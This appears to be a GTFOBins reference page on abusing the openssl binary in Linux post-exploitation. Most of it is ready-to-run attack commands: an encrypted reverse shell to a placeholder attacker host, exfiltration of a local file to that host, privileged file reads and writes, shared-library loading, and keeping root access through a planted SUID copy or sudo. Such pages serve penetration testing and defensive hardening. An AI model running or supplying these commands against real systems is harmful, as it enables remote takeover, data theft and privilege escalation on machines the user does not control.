# GTFOBin: openssl

## Reverse shell

It can send back a reverse shell to a listening attacker to open a remote network access.

To receive the shell run the following on the attacker box:

```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345

```

Communication between attacker and target will be encrypted.

```
RHOST=attacker.com
RPORT=12345
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
```

## File upload

It can exfiltrate files on the network.

To collect the file run the following on the attacker box:

```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save

```

Send a local file via TCP. Transmission will be encrypted.

```
RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
openssl s_client -quiet -connect $RHOST:$RPORT < "$LFILE"
```

## File download

It can download remote files.

To send the file run the following on the attacker box:

```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send

```

Fetch a file from a TCP port, transmission will be encrypted.

```
RHOST=attacker.com
RPORT=12345
LFILE=file_to_save
openssl s_client -quiet -connect $RHOST:$RPORT > "$LFILE"
```

## File write

It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.

```
LFILE=file_to_write
echo DATA | openssl enc -out "$LFILE"
```

```
LFILE=file_to_write
TF=$(mktemp)
echo "DATA" > $TF
openssl enc -in "$TF" -out "$LFILE"
```

## File read

It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

```
LFILE=file_to_read
openssl enc -in "$LFILE"
```

## Library load

It loads shared libraries that may be used to run code in the binary execution context.

```
openssl req -engine ./lib.so
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

To receive the shell run the following on the attacker box:

```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345

```

Communication between attacker and target will be encrypted.

```
sudo install -m =xs $(which openssl) .

RHOST=attacker.com
RPORT=12345
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
```

```
sudo install -m =xs $(which openssl) .

LFILE=file_to_write
echo DATA | openssl enc -out "$LFILE"
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

To receive the shell run the following on the attacker box:

```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345

```

Communication between attacker and target will be encrypted.

```
RHOST=attacker.com
RPORT=12345
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
```